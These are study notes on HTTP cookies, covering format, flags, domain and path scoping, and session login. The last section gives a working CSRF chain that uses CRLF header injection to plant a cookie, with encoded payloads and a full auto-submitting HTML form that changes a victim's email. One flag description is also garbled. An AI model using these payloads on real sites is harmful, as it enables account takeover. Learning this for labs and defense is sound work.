
### General Notes

Created to make [[HTTP]] [[Protocol]] stateful.
- They are textual information installed by a website into the Cookie Jar of the **browser**.
- Storing data on the client side instead of the server side ([[Sessions]]).

> Cookie Jar is storage space where web browser stores cookies.

Can be viewed in JavaScript using `document.cookie` through the DOM, or the Document Object Model.

---
### Cookie Format

Servers can set cookie via the `Set-Cookie` [[HTTP]] header in a response message.
Cookies contain the following data:
* **Cookie Content**: Text Key-Value pairs that contain data.
* **Expiration Date**: The data when the cookie is no longer to be used, or not to be sent by the browser to the server.
* **Path**: sends the cookies to all subsequent requests to this path and everything under it.
* **Domain**: the scope of the cookie, or which domains and subdomains it has access to.
* `HTTPOnly` Flag: only HTML technology can read the cookie. Secure against [[Cross Site Scripting (XSS)]].
* `Secure` Flag: Cookies are only sent over [[HTTPS]].

##### Cookie Policy

Cookies are sent to the valid domain and path, and only when they are not expired.
- They also are managed according to the flags that are set. 
- Cookies are sent to the subdomains of that domain as well.

> The **Path** specifies the folder that the cookie is sent to in the **domain**. If the path is empty, it is sent to the whole domain.

If **domain** is not set, the `Host-only` flag is set, and the cookie is only sent to the exact hostname of the request. 
- The domain becomes set to the hostname.

---
### Cookie Protocol

Login Example: 
1. Browser sends a POST request with username and password
2. Server sends a response with a `set-cookie` header to tell the browser to install the cookie
3. For every further request, the browser considers the cookie data and flags
4. If the checks pass, then a cookie will be inserted in the header of the browser request

> What this does, is that the browser now manages to maintain a *stateful* connection to the server, meaning that all subsequent requests don't need authentication again.

---
### Cookie Domain

A cookie with a domain value specified is only sent to the target with the same domain value.
- A cookie with a domain value different from the target but is a suffix of the target domain then it is also sent.

Higher level subdomains cannot set cookies for lower level subdomains.
- But lower level subdomains can set cookies for higher level subdomains.

> Cookie with `host-only` flag set to true is one that does not have a domain value. Sent only to target domain that set it.

---
### Modifying Cookies for [[CSRF]]

- A technique to check for adding cookies is through header injection.
```
/?search=mins
Set-Cookie: csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p;
```

- Adding a new line then adding the `Set-Cookie` header with the cookie. To use it, it must be URL-encoded. [[Web Encoding]].
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b
```

- To use it in the HTML payload to set a cookie, replace the `script` tags with:
```HTML
<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

- This loads the page that sets the cookie, then since it isn't an image, the `onerror` attribute is fired submitting the form.
``` HTML
<html> 
	<body> 
		<form action="https://URL/path" method="POST"> 
			<input type="hidden" name="email" value="newmins@mins.com" /> 
			<input type="hidden" name="csrf" value="<csrf-token>" />
		</form> 
		<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body> 
</html>
```

---
